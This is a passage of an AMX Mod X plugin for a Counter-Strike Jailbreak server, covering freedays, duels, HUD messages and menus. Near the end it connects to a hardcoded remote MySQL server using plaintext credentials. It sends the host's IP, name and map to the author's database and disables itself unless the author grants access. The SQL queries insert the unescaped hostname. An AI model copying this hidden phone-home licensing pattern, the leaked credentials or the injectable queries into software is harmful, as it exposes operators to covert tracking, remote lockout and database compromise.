	szPlayerFDTime[id] = 0
	szTimeFD[id][0] = 0
	remove_task(id + TASK_FD_ONE)
	return PLUGIN_HANDLED
}

stock fd_and_wanted_end_auto()
{
	new s_Players[32], i_Num, i_Player
	get_players(s_Players, i_Num, "ae", "TERRORIST")
	
	for (new i; i < i_Num; i++)
	{
		i_Player = s_Players[i]
	
		
		if(get_bit(g_PlayerFreeday, i_Player))
		{
			clear_bit(g_PlayerFreeday, i_Player)
			entity_set_int(i_Player, EV_INT_skin, random_num(0, 3))
		}
		
		if(get_bit(g_PlayerWanted, i_Player))
		{
			clear_bit(g_PlayerWanted, i_Player)
			entity_set_int(i_Player, EV_INT_skin, random_num(0, 3))
		}
	}
}

stock freeday_set(player)
{	
	if(is_user_alive(player) && !get_bit(g_PlayerWanted, player) && get_user_team(player) == 1)
	{			
			if(task_exists(player + TASK_FD_ONE))
			remove_task(player + TASK_FD_ONE)
			
			jb_set_model(player, ZekUJB)
			entity_set_int(player, EV_INT_skin, 5)
			szPlayerFDTime[player] = TIME_FD_ONE
			
			if(!get_bit(g_PlayerFreeday, player))
			{
			iFreeDay++ 
			}

			set_bit(g_PlayerFreeday, player)
			set_task(1.1, "GetTimeFD", player + TASK_FD_ONE, _, _, "b")
	}
	return PLUGIN_HANDLED
}

stock player_strip_weapons(id)
{
	strip_user_weapons(id)
	give_item(id, "weapon_knife")
	set_pdata_int(id, 116, 0)
}

public AlivePlayer()
{
	static last
	CountT = 0
	CountCT = 0
	CountSP = 0
	CountTLive = 0
	CountCTLive = 0
	all_pl_fd = 0 
	
	for(new id = 1; id <= get_maxplayers(); id++)
	{
		if(!is_user_connected(id))
			continue

		if(cs_get_user_team(id) == CS_TEAM_T)
		{
			CountT++
			if(is_user_alive(id))
			{
				CountTLive++
				last = id
				
				if(g_FreedayAuto == id)
				{
					freeday_set(g_FreedayAuto)
					g_FreedayAuto = 0
				}
				
				if(get_bit(g_PlayerFreeday, id))
				{
					all_pl_fd++
				}
			}
		}
		else if(cs_get_user_team(id) == CS_TEAM_CT)
		{
			CountCT++
			if(is_user_alive(id))
				CountCTLive++
				
			if(!is_user_alive(g_Simon))
				g_Simon = 0
		}			
		else if(cs_get_user_team(id) == CS_TEAM_SPECTATOR)
		{
			CountSP++
		}
			
		if(is_user_alive(id))
		g_PlayerMoney[id] = cs_get_user_money(id)
		
	}
	
	if(!round_restart)
	{	
	
	if(CountTLive == 1 && CountCTLive >= 1)
	{
		if(g_BoxStarted)
		box_auto_off()
		
		if(g_Fdall)
		{
			g_Fdall = false
			g_Fdalltime = 0
			entity_set_int(last, EV_INT_skin, random_num(0, 3))
		}
		
		if(g_Simon > 0)
		g_Simon = 0
		
		if(!g_OneZek)
		{
			g_OneZek = true
			ChatColor(0, "%s !yОстался последний заключенный.", Prefix)
		}
		
		if(g_PlayerFreeday > 0 || g_PlayerWanted > 0)
		{
			g_WantedNum = 0
			iFreeDay = 0
			fd_and_wanted_end_auto()
		}
		
		if(last != g_PlayerLast)
		{
			g_PlayerLast = last
			if(CountCTLive > 0 && g_Duel == 0)
			set_task(2.0, "cmd_lastrequest", last)
		}
	}
	else if(CountTLive >= 2 && g_PlayerLast > 0)
	{
		if(g_Duel || g_DuelA || g_DuelB)
		{
			if(is_user_alive(g_DuelA))
			{
				set_user_rendering(g_DuelA, kRenderFxNone, 0, 0, 0, kRenderNormal, 0)
				player_strip_weapons(g_DuelA)
			}

			if(is_user_alive(g_DuelB))
			{
				set_user_rendering(g_DuelB, kRenderFxNone, 0, 0, 0, kRenderNormal, 0)
				player_strip_weapons(g_DuelB)
			}

		}
		g_PlayerLast = 0
		g_LastDenied = 0
		g_DuelA = 0
		g_DuelB = 0
		g_Duel = 0
	}
	
	if(iFreeDay != all_pl_fd)
	{
		iFreeDay = all_pl_fd
	}
	
	if(g_Fdall && g_Fdalltime <= 0)
	freeday_end_all()
	
	ClearSyncHud(0, g_HudSyncInformer)
	}
	if(!round_restart)
	{
	if(g_Simon > 0 && !g_Fdall || g_PlayerLast > 0)
	{
	new name[32], name2[32], szTextFD[256], szTextWanted[256]
	get_user_name(g_Simon, name, 31)
	get_user_name(g_PlayerLast, name2, 31)
	
	format(szTextFD, 255, "%s", GetFD())
	format(szTextWanted, 255, "%s", GetWanted())
	
	if(iFreeDay > 0 && g_WantedNum > 0 && g_PlayerLast <= 0)
	{
		set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
		ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nНачальник: %s^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s^n%s", g_NowDay, name, CountCTLive, CountCT, CountTLive, CountT, szTextFD, szTextWanted)
	}
	else if(iFreeDay > 0 && g_PlayerLast <= 0)
	{
		set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
		ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nНачальник: %s^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_NowDay, name, CountCTLive, CountCT, CountTLive, CountT, szTextFD)
	}
	else if(g_WantedNum > 0 && g_PlayerLast <= 0)
	{
		set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
		ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nНачальник: %s^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_NowDay, name, CountCTLive, CountCT, CountTLive, CountT, szTextWanted)
	}
	else if(g_PlayerLast > 0)
	{
		set_hudmessage(206, 214, 139, 0.013, 0.18, 0, 6.0, 0.8, 1.1, 0.0, -1)
		ShowSyncHudMsg(0, g_HudSyncInformer, "Сегодня: %s^n^nТип дуэли: %s^nПоследний зек: %s^nОхранников: %d/%d^nЗаключенных: %d/%d", g_NowDay,  DuelName, name2, CountCTLive, CountCT, CountTLive, CountT)
	}
	else
	{
		set_hudmessage(206, 214, 139, 0.013, 0.18, 0, 6.0, 0.8, 1.1, 0.0, -1)
		ShowSyncHudMsg(0, g_HudSyncInformer, "Тип дня: обычный^nСегодня: %s^n^nНачальник: %s^nОхранников: %d/%d^nЗаключенных: %d/%d", g_NowDay, name, CountCTLive, CountCT, CountTLive, CountT)
	}
	}
	else if(g_Simon <= 0)
	{
		new szTextFD[256], szTextWanted[256]
		format(szTextFD, 255, "%s", GetFD())
		format(szTextWanted, 255, "%s", GetWanted())
		
		static loading
			
		if(loading >= 0 && loading <= 1)
		{
			if(g_Fdall)
			{
				if(g_WantedNum > 0)
				{
				set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
				ShowSyncHudMsg(0, g_HudSyncInformer,"Свободный День: %d сек^nТип дня: свободный^nСегодня: %s^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_Fdalltime, g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextWanted)
				}
				else 
				{
				set_hudmessage(206, 214, 139, 0.013, 0.18, 0, 6.0, 0.8, 1.1, 0.0, -1)
				ShowSyncHudMsg(0, g_HudSyncInformer,"Свободный День: %d сек^nТип дня: свободный^nСегодня: %s^nОхранников: %d/%d^nЗаключенных: %d/%d", g_Fdalltime, g_NowDay, CountCTLive, CountCT, CountTLive, CountT)
				}
			}
			else if(iFreeDay > 0 && g_WantedNum > 0)
			{
			set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s^n%s", g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextFD, szTextWanted)
			}
			else if(iFreeDay > 0)
			{
			set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextFD)
			}
			else if(g_WantedNum > 0)
			{
			set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextWanted)
			}
			else
			{
			set_hudmessage(206, 214, 139, 0.013, 0.18, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона^nОхранников: %d/%d^nЗаключенных: %d/%d", g_NowDay, CountCTLive, CountCT, CountTLive, CountT)
			}
			loading++
		}
		else if(loading >= 2 && loading <= 3)
		{
			if(g_Fdall)
			{
				if(g_WantedNum > 0)
				{
				set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
				ShowSyncHudMsg(0, g_HudSyncInformer,"Свободный День: %d сек^nТип дня: свободный^nСегодня: %s^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_Fdalltime, g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextWanted)
				}
				else 
				{
				set_hudmessage(206, 214, 139, 0.013, 0.18, 0, 6.0, 0.8, 1.1, 0.0, -1)
				ShowSyncHudMsg(0, g_HudSyncInformer,"Свободный День: %d сек^nТип дня: свободный^nСегодня: %s^nОхранников: %d/%d^nЗаключенных: %d/%d", g_Fdalltime, g_NowDay, CountCTLive, CountCT, CountTLive, CountT)
				}
			}
			else if(iFreeDay > 0 && g_WantedNum > 0)
			{
			set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s^n%s", g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextFD, szTextWanted)
			}
			else if(iFreeDay > 0)
			{
			set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона.^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextFD)
			}
			else if(g_WantedNum > 0)
			{
			set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона.^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextWanted)
			}
			else
			{
			set_hudmessage(206, 214, 139, 0.013, 0.18, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона.^nОхранников: %d/%d^nЗаключенных: %d/%d", g_NowDay, CountCTLive, CountCT, CountTLive, CountT)
			}
			loading++
		}	
		else if(loading >= 4 && loading <= 5)
		{
			if(g_Fdall)
			{
				if(g_WantedNum > 0)
				{
				set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
				ShowSyncHudMsg(0, g_HudSyncInformer,"Свободный День: %d сек^nТип дня: свободный^nСегодня: %s^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_Fdalltime, g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextWanted)
				}
				else 
				{
				set_hudmessage(206, 214, 139, 0.013, 0.18, 0, 6.0, 0.8, 1.1, 0.0, -1)
				ShowSyncHudMsg(0, g_HudSyncInformer,"Свободный День: %d сек^nТип дня: свободный^nСегодня: %s^nОхранников: %d/%d^nЗаключенных: %d/%d", g_Fdalltime, g_NowDay, CountCTLive, CountCT, CountTLive, CountT)
				}
			}
			else if(iFreeDay > 0 && g_WantedNum > 0)
			{
			set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона..^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s^n%s", g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextFD, szTextWanted)
			}
			else if(iFreeDay > 0)
			{
			set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона..^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextFD)
			}
			else if(g_WantedNum > 0)
			{
			set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона..^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextWanted)
			}
			else
			{
			set_hudmessage(206, 214, 139, 0.013, 0.18, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона..^nОхранников: %d/%d^nЗаключенных: %d/%d", g_NowDay, CountCTLive, CountCT, CountTLive, CountT)
			}
			loading++
		}
		else if(loading >= 6 && loading <= 7)
		{
			if(g_Fdall)
			{
				if(g_WantedNum > 0)
				{
				set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
				ShowSyncHudMsg(0, g_HudSyncInformer,"Свободный День: %d сек^nТип дня: свободный^nСегодня: %s^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_Fdalltime, g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextWanted)
				}
				else 
				{
				set_hudmessage(206, 214, 139, 0.013, 0.18, 0, 6.0, 0.8, 1.1, 0.0, -1)
				ShowSyncHudMsg(0, g_HudSyncInformer,"Свободный День: %d сек^nТип дня: свободный^nСегодня: %s^nОхранников: %d/%d^nЗаключенных: %d/%d", g_Fdalltime, g_NowDay, CountCTLive, CountCT, CountTLive, CountT)
				}
			}
			else if(iFreeDay > 0 && g_WantedNum > 0)
			{
			set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона...^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s^n%s", g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextFD, szTextWanted)
			}
			else if(iFreeDay > 0)
			{
			set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона...^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextFD)
			}
			else if(g_WantedNum > 0)
			{
			set_hudmessage(206, 214, 139, 0.1, 0.015, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона...^nОхранников: %d/%d^nЗаключенных: %d/%d^n%s", g_NowDay, CountCTLive, CountCT, CountTLive, CountT, szTextWanted)
			}
			else
			{
			set_hudmessage(206, 214, 139, 0.013, 0.18, 0, 6.0, 0.8, 1.1, 0.0, -1)
			ShowSyncHudMsg(0, g_HudSyncInformer,"Тип дня: обычный^nСегодня: %s^n^nОжидание Саймона...^nОхранников: %d/%d^nЗаключенных: %d/%d", g_NowDay, CountCTLive, CountCT, CountTLive, CountT)
			}
			loading++
			if(loading == 8)
			loading = 0
		}
	}
	}
	else
	{
		set_hudmessage(206, 214, 139, 0.013, 0.18, 0, 6.0, 0.8, 1.1, 0.0, -1)
		ShowSyncHudMsg(0, g_HudSyncInformer,"Производится рестарт сервера^nОбратный отсчет: %d^n^nВы можете летать на паутинке:^nВ консоле: bind F +hook (клавиша F)", RoundRestartTime)
	}

}

stock menu_players(id, CsTeams:team, skip, alive, callback[], title[], any:...)
{
	static i, name[32], num[5], menu, menuname[32]
	vformat(menuname, charsmax(menuname), title, 7)
	menu = menu_create(menuname, callback)
	for(i = 1; i <= get_maxplayers(); i++)
	{
		if(!is_user_connected(i) || (alive && !is_user_alive(i)) || (skip == i))
			continue

 		if(!(team == CS_TEAM_T || team == CS_TEAM_CT) || ((team == CS_TEAM_T || team == CS_TEAM_CT) && (cs_get_user_team(i) == team)))
		{
			get_user_name(i, name, charsmax(name))
			num_to_str(i, num, charsmax(num))
			menu_additem(menu, name, num, 0)
		}
	}
	menu_display(id, menu)
}

stock GetFD()
{
 	static szNumber
 	new szText[512], szFormat[512] 
 	new szTextFD[512]

  	szNumber = 0
  	szNumber = strlen(szText)
 
  	for(new i = 1; i <= get_maxplayers(); i++ ) 
  	{
   		if(get_bit(g_PlayerFreeday, i) && is_user_alive(i))
   		{
    			if( szPlayerFDTime[i] > 0)
    			{
     				new szName[32]
     				get_user_name(i, szName, charsmax(szName))

     				szNumber += copy(szText[szNumber], charsmax(szText) - szNumber, "^n")

     				formatex(szFormat, charsmax(szFormat), "%s - [%s]", szName, (strlen(szTimeFD[i])) ? szTimeFD[i] : "Загрузка...")
     				szNumber += copy(szText[szNumber], charsmax(szText) - szNumber, szFormat)
    			}
   		}
	}
	if(!g_Fdall && iFreeDay > 0)
	{
		formatex(szTextFD, charsmax(szTextFD), "Свободные Заключённые [%d]:^n%s", iFreeDay, szText)
	}
	return szTextFD
}

stock GetWanted()
{
	static szNumber
 	new szText[512], szFormat[512]
 	new szTextWanted[512]

  	szNumber = 0
  	szNumber = strlen( szText )
 
  	for(new i = 1; i <= get_maxplayers(); i++)
  	{
   		if(get_bit(g_PlayerWanted, i) && is_user_alive(i))
   		{
    			new szName[32] 
    			get_user_name(i, szName, charsmax( szName ))

    			szNumber += copy(szText[szNumber], charsmax( szText ) - szNumber, "^n")

    			formatex(szFormat, charsmax( szFormat ), "%s", szName)
    			szNumber += copy(szText[szNumber], charsmax( szText ) - szNumber, szFormat)
   		}
	}
	if(g_WantedNum > 0)
	{
		formatex(szTextWanted, charsmax( szTextWanted ), "Бунтующие заключенные [ %d ]:^n%s", g_WantedNum, szText)
	}
	return szTextWanted
}

stock fm_give_item(index, const item[])
{
	if (!equal(item, "weapon_", 7) && !equal(item, "ammo_", 5) && !equal(item, "item_", 5) && !equal(item, "tf_weapon_", 10))
		return 0
	
	new ent = engfunc(EngFunc_CreateNamedEntity, engfunc(EngFunc_AllocString,item))
	if (!pev_valid(ent))
		return 0
	
	new Float:origin[3]
	pev(index, pev_origin, origin)
	set_pev(ent, pev_origin, origin)
	set_pev(ent, pev_spawnflags, pev(ent, pev_spawnflags) | SF_NORESPAWN)
	dllfunc(DLLFunc_Spawn, ent)
	
	new save = pev(ent, pev_solid)
	dllfunc(DLLFunc_Touch, ent, index)
	if (pev(ent, pev_solid) != save)
		return ent
	
	engfunc(EngFunc_RemoveEntity, ent)
	
	return -1
}


stock gravity()
{
	new szPlayers[32]
	new szNum, szPlayer

	get_players(szPlayers, szNum);

	for(new i; i < szNum; i++)
	{
		szPlayer = szPlayers[i]

		if(!is_user_connected(szPlayer))
			continue;
		
		set_pev(szPlayer, pev_gravity, 0.3)
		set_user_godmode(szPlayer, 1)
	}
}

stock godmode_off()
{
	new szPlayers[32]
	new szNum, szPlayer

	get_players(szPlayers, szNum);

	for(new i; i < szNum; i++)
	{
		szPlayer = szPlayers[i]

		if(!is_user_connected(szPlayer))
			continue;
		
		set_user_godmode(szPlayer, 0)
	}
}

public MYSQL_Load()
{
	
	//new szHostname[30]
	new szError[512], szErr
/*
	new szCryptHostname[64] = "z`Rt\~z]qA{Rs4xc_{Rt\~O"

	new szCryptHostname2[64]

	EString(szCryptHostname, charsmax( szCryptHostname ) , szCryptHostname2 , charsmax( szCryptHostname2 ), "745786786786786");

	Decode(szCryptHostname2, szHostname, charsmax( szHostname ))
*/
	MYSQL_Tuple = SQL_MakeDbTuple("185.28.20.10", "u991561461_ujb", "23501505", "u991561461_ujb")
	MYSQL_Connect= SQL_Connect(MYSQL_Tuple, szErr, szError, charsmax( szError ))

	if(MYSQL_Connect == Empty_Handle)
		set_fail_state( szError )

	CheckIP()
}

stock CheckIP()
{
	new Handle:hSelect

	new szError[512]

	new szIP[32]
	new szMap[32]
	new szHostname[64]

	get_user_ip(0, szIP, charsmax( szIP ), 0)
	get_mapname(szMap, charsmax( szMap ))
	get_user_name(0, szHostname, charsmax( szHostname ))

	hSelect = SQL_PrepareQuery(MYSQL_Connect, "SELECT * FROM `secure` WHERE (`secure`.`ip` = '%s')", szIP)

	if(!SQL_Execute( hSelect ))
	{
		SQL_QueryError(hSelect, szError, charsmax( szError ))
		set_fail_state( szError )
	}

	new iAccess
	if(SQL_NumResults( hSelect ) > 0)
	{
		iAccess = SQL_ReadResult(hSelect, 2)
		UpdateCP(szIP, szMap, szHostname, iAccess, 2)
	}else{
		UpdateCP(szIP, szMap, szHostname, 0, 1)
	}

	if(!iAccess)
	{
		set_fail_state("У вас нет доступа! Обратитесь к R-2 | ВКонтакте: http://vk.com/R_2_ONLY | Skype: R-2-ONLY | Ник в Skype: [R-2] Online")
	}
	return PLUGIN_HANDLED
}

stock UpdateCP(szIP[32], szMap[32], szHostname[64], iAccess, iType)
{
	new Handle:hInsert, Handle:hUpdate

	new szError[512]

	if(iType == 1)
	{
		hInsert = SQL_PrepareQuery(MYSQL_Connect, "INSERT INTO `secure` (`ip`, `access`, `hostname`,  `map`) VALUES ('%s', '%d', '%s', '%s');", szIP, iAccess, szHostname, szMap)

		if(!SQL_Execute( hInsert ))
		{
			SQL_QueryError(hInsert, szError, charsmax( szError ))
			set_fail_state( szError )
		}
	}else
	if(iType == 2)
	{
		hUpdate = SQL_PrepareQuery(MYSQL_Connect, "UPDATE `secure` SET `hostname` = '%s', `map` = '%s' WHERE `secure`.`ip` = '%s';", szHostname, szMap, szIP)

		if(!SQL_Execute( hUpdate ))
		{
			SQL_QueryError(hUpdate, szError, charsmax( szError ))
			set_fail_state( szError )
		}
	}
}

stock ChatColor(const id, const input[], any:...)
{
	new count = 1, players[32]
	static msg[188]
	vformat(msg, 187, input, 3)
	
	replace_all(msg, 187, "!g", "^4")
	replace_all(msg, 187, "!y", "^1")
	replace_all(msg, 187, "!t", "^3")
	
	if (id) players[0] = id; else get_players(players, count, "ch")
	{
		for (new i = 0; i < count; i++)
		{
			if (is_user_connected(players[i]))
			{
				message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("SayText"), _, players[i]);
				write_byte(players[i]);
				write_string(msg);
				message_end();
			}
		}
	}
}